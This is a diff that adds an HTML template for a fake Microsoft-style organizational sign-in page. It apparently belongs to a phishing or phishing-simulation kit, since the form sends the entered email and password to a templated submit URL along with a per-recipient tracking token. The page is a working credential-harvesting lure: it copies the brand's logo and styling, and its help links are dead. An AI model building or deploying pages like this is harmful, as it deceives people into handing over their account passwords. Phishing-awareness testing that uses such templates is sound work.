@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in to your account</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Segoe UI",Tahoma,Geneva,Verdana,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;flex-direction:column}
+.login-container{display:flex;align-items:center;justify-content:center;flex:1;padding:20px}
+.login-card{background:#fff;box-shadow:0 2px 6px rgba(0,0,0,0.2);max-width:440px;width:100%;padding:44px}
+.logo-area{margin-bottom:16px}
+.logo-area svg{width:108px;height:24px}
+h1.title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:4px}
+p.subtitle{font-size:13px;color:#1b1b1b;margin-bottom:24px}
+.form-group{margin-bottom:16px}
+.form-group input[type="email"],
+.form-group input[type="password"],
+.form-group input[type="text"]{width:100%;padding:6px 10px;font-size:15px;border:1px solid #666;outline:none;font-family:inherit}
+.form-group input:focus{border-color:#0067b8}
+.error-msg{color:#e81123;font-size:13px;margin-top:4px;display:none}
+a.forgot-link{font-size:13px;color:#0067b8;text-decoration:none;display:block;margin-bottom:16px}
+a.forgot-link:hover{text-decoration:underline;color:#005a9e}
+.btn-next{background:#0067b8;color:#fff;border:none;padding:8px 20px;font-size:15px;cursor:pointer;font-family:inherit;min-width:108px}
+.btn-next:hover{background:#005a9e}
+.btn-next:focus{outline:2px solid #000;outline-offset:2px}
+.divider{margin:24px 0 16px;font-size:13px;color:#1b1b1b}
+.create-account{font-size:13px;color:#0067b8;text-decoration:none}
+.create-account:hover{text-decoration:underline}
+.step{display:none}
+.step.active{display:block}
+.email-display{font-size:15px;color:#1b1b1b;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.email-display .back-arrow{cursor:pointer;font-size:18px;color:#0067b8}
+.footer{background:#f2f2f2;padding:16px 20px;text-align:center;font-size:12px;color:#737373}
+.footer a{color:#737373;text-decoration:none}
+.footer a:hover{text-decoration:underline}
+@media(max-width:480px){.login-card{padding:24px;box-shadow:none}}
+</style>
+</head>
+<body>
+<div class="login-container">
+<div class="login-card">
+<div class="logo-area">
+<!-- Microsoft logo - simplified representation -->
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 24" width="108" height="24">
+<rect x="0" y="0" width="11" height="11" fill="#f25022"/>
+<rect x="12" y="0" width="11" height="11" fill="#7fba00"/>
+<rect x="0" y="12" width="11" height="11" fill="#00a4ef"/>
+<rect x="12" y="12" width="11" height="11" fill="#ffb900"/>
+</svg>
+</div>
+<h1 class="title">Sign in</h1>
+
+<form id="loginForm" method="POST" action="{{ submit_url }}">
+<input type="hidden" name="recipient_token" value="{{ recipient_token }}">
+
+<!-- Step 1: Email -->
+<div class="step active" id="step-email">
+<p class="subtitle">Use your organizational account</p>
+<div class="form-group">
+<input type="email" id="emailInput" name="email" placeholder="someone@example.com" autocomplete="username" required>
+<div class="error-msg" id="emailError">Enter a valid email address.</div>
+</div>
+<p style="font-size:13px;color:#1b1b1b;margin-bottom:16px">
+<a href="#" class="forgot-link" style="margin-bottom:0;display:inline" onclick="return false;">Can't access your account?</a>
+</p>
+<div style="text-align:right">
+<button type="button" class="btn-next" id="btnNext" onclick="showPasswordStep()">Next</button>
+</div>
+<div class="divider">No account? <a href="#" class="create-account" onclick="return false;">Create one!</a></div>
+</div>
+
+<!-- Step 2: Password -->
+<div class="step" id="step-password">
+<div class="email-display">
+<span class="back-arrow" onclick="showEmailStep()">&larr;</span>
+<span id="displayEmail"></span>
+</div>
+<p class="subtitle">Enter password</p>
+<div class="form-group">
+<input type="password" id="passwordInput" name="password" placeholder="Password" autocomplete="current-password" required>
+<div class="error-msg" id="passwordError">Your account or password is incorrect.</div>
+</div>
+<a href="#" class="forgot-link" onclick="return false;">Forgot my password</a>
+<div style="text-align:right">
+<button type="submit" class="btn-next">Sign in</button>
+</div>
+</div>
+</form>
+</div>
+</div>
+
+<div class="footer">
+<span>Terms of use</span>
+<span style="margin:0 8px">|</span>
+<span>Privacy &amp; cookies</span>
+</div>
+
+<script>
+function showPasswordStep(){
+var email=document.getElementById("emailInput");
+if(!email.value||email.value.indexOf("@")<1){
+document.getElementById("emailError").style.display="block";
+return;
+}
+document.getElementById("emailError").style.display="none";
+document.getElementById("displayEmail").textContent=email.value;
+document.getElementById("step-email").classList.remove("active");
+document.getElementById("step-password").classList.add("active");
+document.getElementById("passwordInput").focus();
+}
+function showEmailStep(){
+document.getElementById("step-password").classList.remove("active");
+document.getElementById("step-email").classList.add("active");
+document.getElementById("emailInput").focus();
+}
+document.getElementById("emailInput").addEventListener("keydown",function(e){
+if(e.key==="Enter"){e.preventDefault();showPasswordStep();}
+});
+</script>
+</body>
+</html>
